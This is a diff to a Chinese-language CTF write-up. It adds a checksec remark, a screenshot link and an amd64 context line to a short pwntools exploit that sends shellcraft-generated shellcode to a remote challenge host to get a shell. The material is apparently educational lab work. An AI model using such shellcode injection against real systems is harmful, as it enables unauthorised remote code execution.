@@ -941,6 +941,10 @@ sh.interactive()
 
 很基础的shellcode，利用pwntools直接生成即可
 
+先checksec一下，发现是amd64小端
+
+![image-20221103150630710](https://nssctf.wdf.ink/img/yxy/image-20221103150630710.png)
+
 直接贴exp：
 
 ```python
@@ -948,6 +952,7 @@ from pwn import *
 
 sh = remote("1.14.71.254","xxxxx")
 
+context(os='linux', arch='amd64')
 payload = asm(shellcraft.sh())
 
 sh.sendline(payload)
